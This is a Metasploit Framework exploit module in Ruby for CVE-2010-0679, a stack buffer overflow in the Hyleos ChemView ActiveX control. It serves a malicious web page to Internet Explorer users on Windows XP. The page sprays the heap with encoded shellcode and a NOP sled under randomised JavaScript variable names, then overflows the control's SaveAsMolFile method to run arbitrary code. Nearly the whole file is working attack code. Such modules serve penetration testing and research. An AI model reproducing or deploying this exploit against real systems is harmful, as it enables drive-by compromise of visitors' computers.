##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking # heap spray :-/

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Hyleos ChemView ActiveX Control Stack Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack-based buffer overflow within version 1.9.5.1 of Hyleos
				ChemView (HyleosChemView.ocx). By calling the 'SaveAsMolFile' or 'ReadMolFile' methods
				with an overly long first argument, an attacker can overrun a buffer and execute
				arbitrary code.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Paul Craig <paul.craig[at]security-assessment.com>', # original discovery/advisory
					'Dz_attacker <dz_attacker[at]hotmail.fr>', # original file format module
					'jduck'   # converted HttpServer module
				],
			'References'     =>
				[
					[ 'CVE', '2010-0679' ],
					[ 'OSVDB', '62276' ],
					[ 'URL', 'http://www.security-assessment.com/files/advisories/2010-02-11_ChemviewX_Activex.pdf' ],
					[ 'EDB', '11422' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'InitialAutoRunScript' => 'migrate -f',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => "\x00",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP0-SP3 / IE 6.0 SP0-2 & IE 7.0', { 'Ret' => 0x0A0A0a0A, 'Offset' => 150 } ]
				],
			'DisclosureDate' => 'Feb 10 2010',
			'DefaultTarget'  => 0))
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)

		clsid = "C372350A-1D5A-44DC-A759-767FC553D96C"
		progid = "HyleosChemView.HLChemView"

		methods = [ "ReadMolFile", "SaveAsMolFile" ]
		method = methods[rand(methods.length)]
		method = "SaveAsMolFile"

		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		# It may be possible to create a more robust exploit, however --
		# 1. The control's base address has been shown to vary (seen at 0x1c90000 and 0x1d90000)
		# 2. The buffer overflow does not appear to be entirely straight forward.

		# Encode the shellcode
		shellcode = Rex::Text.to_unescape(p.encoded, Rex::Arch.endian(target.arch))

		# Setup exploit buffers
		nops 	  = Rex::Text.to_unescape([target.ret].pack('V'))
		ret  	  = Rex::Text.uri_encode([target.ret].pack('L'))
		blocksize = 0x40000
		fillto    = 300
		offset 	  = target['Offset']

		# Randomize the javascript variable names
		chemview     = rand_text_alpha(rand(100) + 1)
		j_shellcode  = rand_text_alpha(rand(100) + 1)
		j_nops       = rand_text_alpha(rand(100) + 1)
		j_ret        = rand_text_alpha(rand(100) + 1)
		j_headersize = rand_text_alpha(rand(100) + 1)
		j_slackspace = rand_text_alpha(rand(100) + 1)
		j_fillblock  = rand_text_alpha(rand(100) + 1)
		j_block      = rand_text_alpha(rand(100) + 1)
		j_memory     = rand_text_alpha(rand(100) + 1)
		j_counter    = rand_text_alpha(rand(30) + 2)

		content = %Q|<html>
<object classid='clsid:#{clsid}' id='#{chemview}'></object>
<script>
#{j_shellcode}=unescape('#{shellcode}');
#{j_nops}=unescape('#{nops}');
#{j_headersize}=20;
#{j_slackspace}=#{j_headersize}+#{j_shellcode}.length;
while(#{j_nops}.length<#{j_slackspace})#{j_nops}+=#{j_nops};
#{j_fillblock}=#{j_nops}.substring(0,#{j_slackspace});
#{j_block}=#{j_nops}.substring(0,#{j_nops}.length-#{j_slackspace});
while(#{j_block}.length+#{j_slackspace}<#{blocksize})#{j_block}=#{j_block}+#{j_block}+#{j_fillblock};
#{j_memory}=new Array();
for(#{j_counter}=0;#{j_counter}<#{fillto};#{j_counter}++)#{j_memory}[#{j_counter}]=#{j_block}+#{j_shellcode};

var #{j_ret}='';
for(#{j_counter}=0;#{j_counter}<=#{offset};#{j_counter}++)#{j_ret}+=unescape('#{ret}');
#{chemview}.#{method}(#{j_ret});
</script>
</html>|


		print_status("Sending #{self.name}")

		# Transmit the response to the client
		send_response_html(cli, content)

		# Handle the payload
		handler(cli)
	end

end
